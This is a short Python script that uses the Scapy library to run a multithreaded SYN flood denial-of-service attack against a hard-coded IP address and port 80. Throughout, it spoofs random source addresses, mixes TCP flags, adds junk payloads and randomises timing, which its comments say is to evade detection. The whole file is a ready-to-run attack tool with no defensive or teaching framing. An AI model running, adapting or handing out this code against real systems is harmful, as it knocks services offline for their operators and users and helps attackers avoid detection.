from scapy.all import *
import random
import threading
import time

# Target
target_ip = "192.168.43.108"
target_port = 80  

# Function to generate a random IP address
def random_ip():
    return ".".join(str(random.randint(1, 255)) for _ in range(4))

# Function to perform SYN Flood with variations
def advanced_syn_flood():
    try:
        print(f"Starting Advanced SYN flood on {target_ip}:{target_port}")
        while True:
            src_ip = random_ip()  # Spoofed source IP
            src_port = random.randint(1024, 65535)
            
            # Randomly switch between SYN, SYN-ACK, and RST to evade detection
            flags = random.choice(["S", "SA", "R"])

            # Craft TCP packet
            ip = IP(src=src_ip, dst=target_ip)
            tcp = TCP(sport=src_port, dport=target_port, flags=flags, seq=random.randint(1000, 9000))
            
            # Add junk payload to make detection harder
            payload = Raw(load=bytes(random.randint(10, 100)))  

            # Send the packet
            send(ip/tcp/payload, verbose=0)
            
            # Random delay for stealthiness
            time.sleep(random.uniform(0.01, 0.1))
            
            print(f"Sent {flags} packet from {src_ip}:{src_port}")
    
    except KeyboardInterrupt:
        print("\nStopped by user")
    except Exception as e:
        print(f"Error: {e}")

# Launch the attack
if __name__ == "__main__":
    attack_threads = []
    for _ in range(5):  # Multiple threads for parallel attacks
        t = threading.Thread(target=advanced_syn_flood)
        attack_threads.append(t)
        t.start()

    for t in attack_threads:
        t.join()




